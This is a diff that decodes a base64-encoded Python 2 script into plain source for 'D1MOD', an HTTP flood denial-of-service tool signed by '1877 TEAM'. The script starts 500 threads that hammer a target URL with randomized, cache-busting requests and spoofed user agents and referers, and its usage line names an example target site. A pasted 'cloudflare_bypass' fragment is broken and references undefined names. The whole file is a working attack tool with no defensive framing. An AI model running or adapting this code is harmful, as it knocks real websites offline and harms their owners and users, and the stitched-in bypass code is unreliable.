@@ -1,1 +1,164 @@
-aW1wb3J0IHVybGxpYjINCmltcG9ydCBzeXMNCmltcG9ydCB0aHJlYWRpbmcNCmltcG9ydCByYW5kb20NCmltcG9ydCByZQ0KDQojZ2xvYmFsIHBhcmFtcw0KdXJsPScnDQpob3N0PScnDQpoZWFkZXJzX3VzZXJhZ2VudHM9W10NCmhlYWRlcnNfcmVmZXJlcnM9W10NCnJlcXVlc3RfY291bnRlcj0wDQpmbGFnPTANCnNhZmU9MA0KDQpkZWYgaW5jX2NvdW50ZXIoKToNCglnbG9iYWwgcmVxdWVzdF9jb3VudGVyDQoJcmVxdWVzdF9jb3VudGVyKz0xDQoNCmRlZiBzZXRfZmxhZyh2YWwpOg0KCWdsb2JhbCBmbGFnDQoJZmxhZz12YWwNCg0KZGVmIHNldF9zYWZlKCk6DQoJZ2xvYmFsIHNhZmUNCglzYWZlPTENCgkNCiMgZ2VuZXJhdGVzIGEgdXNlciBhZ2VudCBhcnJheQ0KZGVmIHVzZXJhZ2VudF9saXN0KCk6DQoJZ2xvYmFsIGhlYWRlcnNfdXNlcmFnZW50cw0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IHg4Nl82NDsgZW4tVVM7IHJ2OjEuOS4xLjMpIEdlY2tvLzIwMDkwOTEzIEZpcmVmb3gvMy41LjMnKQ0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW47IHJ2OjEuOS4xLjMpIEdlY2tvLzIwMDkwODI0IEZpcmVmb3gvMy41LjMgKC5ORVQgQ0xSIDMuNS4zMDcyOSknKQ0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMjsgZW4tVVM7IHJ2OjEuOS4xLjMpIEdlY2tvLzIwMDkwODI0IEZpcmVmb3gvMy41LjMgKC5ORVQgQ0xSIDMuNS4zMDcyOSknKQ0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW4tVVM7IHJ2OjEuOS4xLjEpIEdlY2tvLzIwMDkwNzE4IEZpcmVmb3gvMy41LjEnKQ0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVMpIEFwcGxlV2ViS2l0LzUzMi4xIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzQuMC4yMTkuNiBTYWZhcmkvNTMyLjEnKQ0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDguMDsgV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzQuMDsgU0xDQzI7IC5ORVQgQ0xSIDIuMC41MDcyNzsgSW5mb1BhdGguMiknKQ0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDguMDsgV2luZG93cyBOVCA2LjA7IFRyaWRlbnQvNC4wOyBTTENDMTsgLk5FVCBDTFIgMi4wLjUwNzI3OyAuTkVUIENMUiAxLjEuNDMyMjsgLk5FVCBDTFIgMy41LjMwNzI5OyAuTkVUIENMUiAzLjAuMzA3MjkpJykNCgloZWFkZXJzX3VzZXJhZ2VudHMuYXBwZW5kKCdNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA4LjA7IFdpbmRvd3MgTlQgNS4yOyBXaW42NDsgeDY0OyBUcmlkZW50LzQuMCknKQ0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDguMDsgV2luZG93cyBOVCA1LjE7IFRyaWRlbnQvNC4wOyBTVjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgSW5mb1BhdGguMiknKQ0KCWhlYWRlcnNfdXNlcmFnZW50cy5hcHBlbmQoJ01vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBNU0lFIDcuMDsgV2luZG93cyBOVCA2LjA7IGVuLVVTKScpDQoJaGVhZGVyc191c2VyYWdlbnRzLmFwcGVuZCgnTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNi4xOyBXaW5kb3dzIFhQKScpDQoJaGVhZGVyc191c2VyYWdlbnRzLmFwcGVuZCgnT3BlcmEvOS44MCAoV2luZG93cyBOVCA1LjI7IFU7IHJ1KSBQcmVzdG8vMi41LjIyIFZlcnNpb24vMTAuNTEnKQ0KCXJldHVybihoZWFkZXJzX3VzZXJhZ2VudHMpDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCmRlZiBjbG91ZGZsYXJlX2J5cGFzcyhzZWxmLCByKTogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICBib2R5ID0gci50ZXh0DQogICAgICAgIHNjaGVtZSA9IHJlLnNlYXJjaChyJ14oW1x3XSopJywgci51cmwpLmdyb3VwKDEpDQogICAgICAgIGRvbWFpbiA9IHJlLnNlYXJjaChyJ1wvXC8oW15cL10qKScsIHIudXJsKS5ncm91cCgxKQ0KICAgICAgICBzdWJtaXRfdXJsID0gJ3t9Oi8ve30vY2RuLWNnaS9sL2Noa19qc2NobCcuZm9ybWF0KHNjaGVtZSwgZG9tYWluKQ0KICAgICAgICBqc2NobF92YyA9IHJlLnNlYXJjaChyJ25hbWU9ImpzY2hsX3ZjIiB2YWx1ZT0iKFx3KykiJywgYm9keSkuZ3JvdXAoMSkNCiAgICAgICAgcGFzID0gcmUuc2VhcmNoKHInbmFtZT0icGFzcyIgdmFsdWU9IiguKz8pIicsIGJvZHkpLmdyb3VwKDEpDQogICAgICAgIGpzY2hsX2Fuc3dlciA9IHN0cihzZWxmLnNvbHZlX2NoYWxsZW5nZShib2R5KSArIGxlbihkb21haW4pKQ0KICAgICAgICB0aW1lLnNsZWVwKDUpDQogICAgICAgIHJldHVybiAnezB9P2pzY2hsX3ZjPXsxfSZwYXNzPXsyfSZqc2NobF9hbnN3ZXI9ezN9Jy5mb3JtYXQoc3VibWl0X3VybCwganNjaGxfdmMsIHBhcywganNjaGxfYW5zd2VyKQ0KDQpPTkVfQlJPV1NFUl9RVUVSWVNfTElNSVQgPSAxNTAwDQoNCkFOVElfRERPU19TTEVFUF9TRUNTID0gMTAwMDANCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KDQojIGdlbmVyYXRlcyBhIHJlZmVyZXIgYXJyYXkNCmRlZiByZWZlcmVyX2xpc3QoKToNCglnbG9iYWwgaGVhZGVyc19yZWZlcmVycw0KCWhlYWRlcnNfcmVmZXJlcnMuYXBwZW5kKCdodHRwOi8vd3d3Lmdvb2dsZS5jb20vP3E9JykNCgloZWFkZXJzX3JlZmVyZXJzLmFwcGVuZCgnaHR0cDovL3d3dy51c2F0b2RheS5jb20vc2VhcmNoL3Jlc3VsdHM/cT0nKQ0KCWhlYWRlcnNfcmVmZXJlcnMuYXBwZW5kKCdodHRwOi8vZW5nYWRnZXQuc2VhcmNoLmFvbC5jb20vc2VhcmNoP3E9JykNCgloZWFkZXJzX3JlZmVyZXJzLmFwcGVuZCgnaHR0cDovLycgKyBob3N0ICsgJy8nKQ0KCXJldHVybihoZWFkZXJzX3JlZmVyZXJzKQ0KCQ0KI2J1aWxkcyByYW5kb20gYXNjaWkgc3RyaW5nDQpkZWYgYnVpbGRibG9jayhzaXplKToNCglvdXRfc3RyID0gJycNCglmb3IgaSBpbiByYW5nZSgwLCBzaXplKToNCgkJYSA9IHJhbmRvbS5yYW5kaW50KDY1LCA5MCkNCgkJb3V0X3N0ciArPSBjaHIoYSkNCglyZXR1cm4ob3V0X3N0cikNCg0KZGVmIHVzYWdlKCk6DQoJcHJpbnQgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScNCglwcmludCAnVVNBR0U6IHB5dGhvbjIgRDFNT0QucHkgPHVybD4nDQoJcHJpbnQgJ0VYQU1QTEUgOiBweXRob24yIEQxTU9ELnB5IGh0dHBzOi8vZ2l2LnRyJw0KCXByaW50ICcxODc3IFRFQU0gaHR0cHM6Ly8xODc3LnRlYW0vJw0KCXByaW50ICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nDQoNCgkNCiNodHRwIHJlcXVlc3QNCmRlZiBodHRwY2FsbCh1cmwpOg0KCXVzZXJhZ2VudF9saXN0KCkNCglyZWZlcmVyX2xpc3QoKQ0KCWNvZGU9MA0KCWlmIHVybC5jb3VudCgiPyIpPjA6DQoJCXBhcmFtX2pvaW5lcj0iJiINCgllbHNlOg0KCQlwYXJhbV9qb2luZXI9Ij8iDQoJcmVxdWVzdCA9IHVybGxpYjIuUmVxdWVzdCh1cmwgKyBwYXJhbV9qb2luZXIgKyBidWlsZGJsb2NrKHJhbmRvbS5yYW5kaW50KDMsMTApKSArICc9JyArIGJ1aWxkYmxvY2socmFuZG9tLnJhbmRpbnQoMywxMCkpKQ0KCXJlcXVlc3QuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsIHJhbmRvbS5jaG9pY2UoaGVhZGVyc191c2VyYWdlbnRzKSkNCglyZXF1ZXN0LmFkZF9oZWFkZXIoJ0NhY2hlLUNvbnRyb2wnLCAnbm8tY2FjaGUnKQ0KCXJlcXVlc3QuYWRkX2hlYWRlcignQWNjZXB0LUNoYXJzZXQnLCAnSVNPLTg4NTktMSx1dGYtODtxPTAuNywqO3E9MC43JykNCglyZXF1ZXN0LmFkZF9oZWFkZXIoJ1JlZmVyZXInLCByYW5kb20uY2hvaWNlKGhlYWRlcnNfcmVmZXJlcnMpICsgYnVpbGRibG9jayhyYW5kb20ucmFuZGludCg1LDEwKSkpDQoJcmVxdWVzdC5hZGRfaGVhZGVyKCdLZWVwLUFsaXZlJywgcmFuZG9tLnJhbmRpbnQoMTEwLDEyMCkpDQoJcmVxdWVzdC5hZGRfaGVhZGVyKCdDb25uZWN0aW9uJywgJ2tlZXAtYWxpdmUnKQ0KCXJlcXVlc3QuYWRkX2hlYWRlcignSG9zdCcsaG9zdCkNCgl0cnk6DQoJCQl1cmxsaWIyLnVybG9wZW4ocmVxdWVzdCkNCglleGNlcHQgdXJsbGliMi5IVFRQRXJyb3IsIGU6DQoJCQkjcHJpbnQgZS5jb2RlDQoJCQlzZXRfZmxhZygxKQ0KCQkJcHJpbnQgJ0FUVEFDS0VEIEJZIEQxTU9EMTg3NycNCgkJCWNvZGU9NTAwDQoJZXhjZXB0IHVybGxpYjIuVVJMRXJyb3IsIGU6DQoJCQkjcHJpbnQgZS5yZWFzb24NCgkJCXN5cy5leGl0KCkNCgllbHNlOg0KCQkJaW5jX2NvdW50ZXIoKQ0KCQkJdXJsbGliMi51cmxvcGVuKHJlcXVlc3QpDQoJcmV0dXJuKGNvZGUpCQkNCg0KCQ0KI2h0dHAgY2FsbGVyIHRocmVhZCANCmNsYXNzIEhUVFBUaHJlYWQodGhyZWFkaW5nLlRocmVhZCk6DQoJZGVmIHJ1bihzZWxmKToNCgkJdHJ5Og0KCQkJd2hpbGUgZmxhZzwyOg0KCQkJCWNvZGU9aHR0cGNhbGwodXJsKQ0KCQkJCWlmIChjb2RlPT01MDApICYgKHNhZmU9PTEpOg0KCQkJCQlzZXRfZmxhZygyKQ0KCQlleGNlcHQgRXhjZXB0aW9uLCBleDoNCgkJCXBhc3MNCg0KIyBtb25pdG9ycyBodHRwIHRocmVhZHMgYW5kIGNvdW50cyByZXF1ZXN0cw0KY2xhc3MgTW9uaXRvclRocmVhZCh0aHJlYWRpbmcuVGhyZWFkKToNCglkZWYgcnVuKHNlbGYpOg0KCQlwcmV2aW91cz1yZXF1ZXN0X2NvdW50ZXINCgkJd2hpbGUgZmxhZz09MDoNCgkJCWlmIChwcmV2aW91cysxMDA8cmVxdWVzdF9jb3VudGVyKSAmIChwcmV2aW91czw+cmVxdWVzdF9jb3VudGVyKToNCgkJCQlwcmludCAiJWQgRDFNT0QgQVRUQUNLSU5HIFNUQVJURUQgOiIgJSAocmVxdWVzdF9jb3VudGVyKQ0KCQkJCXByZXZpb3VzPXJlcXVlc3RfY291bnRlcg0KCQlpZiBmbGFnPT0yOg0KCQkJcHJpbnQgIlxuLS0gRDFNT0QgQXR0YWNrIEZpbmlzaGVkIC0tIg0KDQojZXhlY3V0ZSANCmlmIGxlbihzeXMuYXJndikgPCAyOg0KCXVzYWdlKCkNCglzeXMuZXhpdCgpDQplbHNlOg0KCWlmIHN5cy5hcmd2WzFdPT0iaGVscCI6DQoJCXVzYWdlKCkNCgkJc3lzLmV4aXQoKQ0KCWVsc2U6DQoJCXByaW50ICItLSBEMU1PRCBBdHRhY2sgU3RhcnRlZCAtLSINCgkJaWYgbGVuKHN5cy5hcmd2KT09IDM6DQoJCQlpZiBzeXMuYXJndlsyXT09InNhZmUiOg0KCQkJCXNldF9zYWZlKCkNCgkJdXJsID0gc3lzLmFyZ3ZbMV0NCgkJaWYgdXJsLmNvdW50KCIvIik9PTI6DQoJCQl1cmwgPSB1cmwgKyAiLyINCgkJbSA9IHJlLnNlYXJjaCgnKGh0dHBzP1w6Ly8pPyhbXi9dKikvPy4qJywgdXJsKQ0KCQlob3N0ID0gbS5ncm91cCgyKQ0KCQlmb3IgaSBpbiByYW5nZSg1MDApOg0KCQkJdCA9IEhUVFBUaHJlYWQoKQ0KCQkJdC5zdGFydCgpDQoJCXQgPSBNb25pdG9yVGhyZWFkKCkNCgkJdC5zdGFydCgp
+import urllib2
+import sys
+import threading
+import random
+import re
+
+#global params
+url=''
+host=''
+headers_useragents=[]
+headers_referers=[]
+request_counter=0
+flag=0
+safe=0
+
+def inc_counter():
+	global request_counter
+	request_counter+=1
+
+def set_flag(val):
+	global flag
+	flag=val
+
+def set_safe():
+	global safe
+	safe=1
+	
+# generates a user agent array
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+########################################################################################################################
+def cloudflare_bypass(self, r):                                                                                         
+        body = r.text
+        scheme = re.search(r'^([\w]*)', r.url).group(1)
+        domain = re.search(r'\/\/([^\/]*)', r.url).group(1)
+        submit_url = '{}://{}/cdn-cgi/l/chk_jschl'.format(scheme, domain)
+        jschl_vc = re.search(r'name="jschl_vc" value="(\w+)"', body).group(1)
+        pas = re.search(r'name="pass" value="(.+?)"', body).group(1)
+        jschl_answer = str(self.solve_challenge(body) + len(domain))
+        time.sleep(5)
+        return '{0}?jschl_vc={1}&pass={2}&jschl_answer={3}'.format(submit_url, jschl_vc, pas, jschl_answer)
+
+ONE_BROWSER_QUERYS_LIMIT = 1500
+
+ANTI_DDOS_SLEEP_SECS = 10000
+######################################################################################################################
+
+
+# generates a referer array
+def referer_list():
+	global headers_referers
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+	
+#builds random ascii string
+def buildblock(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
+
+def usage():
+	print '---------------------------------------------------'
+	print 'USAGE: python2 D1MOD.py <url>'
+	print 'EXAMPLE : python2 D1MOD.py https://giv.tr'
+	print '1877 TEAM https://1877.team/'
+	print '---------------------------------------------------'
+
+	
+#http request
+def httpcall(url):
+	useragent_list()
+	referer_list()
+	code=0
+	if url.count("?")>0:
+		param_joiner="&"
+	else:
+		param_joiner="?"
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', random.choice(headers_useragents))
+	request.add_header('Cache-Control', 'no-cache')
+	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Connection', 'keep-alive')
+	request.add_header('Host',host)
+	try:
+			urllib2.urlopen(request)
+	except urllib2.HTTPError, e:
+			#print e.code
+			set_flag(1)
+			print 'ATTACKED BY D1MOD1877'
+			code=500
+	except urllib2.URLError, e:
+			#print e.reason
+			sys.exit()
+	else:
+			inc_counter()
+			urllib2.urlopen(request)
+	return(code)		
+
+	
+#http caller thread 
+class HTTPThread(threading.Thread):
+	def run(self):
+		try:
+			while flag<2:
+				code=httpcall(url)
+				if (code==500) & (safe==1):
+					set_flag(2)
+		except Exception, ex:
+			pass
+
+# monitors http threads and counts requests
+class MonitorThread(threading.Thread):
+	def run(self):
+		previous=request_counter
+		while flag==0:
+			if (previous+100<request_counter) & (previous<>request_counter):
+				print "%d D1MOD ATTACKING STARTED :" % (request_counter)
+				previous=request_counter
+		if flag==2:
+			print "\n-- D1MOD Attack Finished --"
+
+#execute 
+if len(sys.argv) < 2:
+	usage()
+	sys.exit()
+else:
+	if sys.argv[1]=="help":
+		usage()
+		sys.exit()
+	else:
+		print "-- D1MOD Attack Started --"
+		if len(sys.argv)== 3:
+			if sys.argv[2]=="safe":
+				set_safe()
+		url = sys.argv[1]
+		if url.count("/")==2:
+			url = url + "/"
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
+		for i in range(500):
+			t = HTTPThread()
+			t.start()
+		t = MonitorThread()
+		t.start()
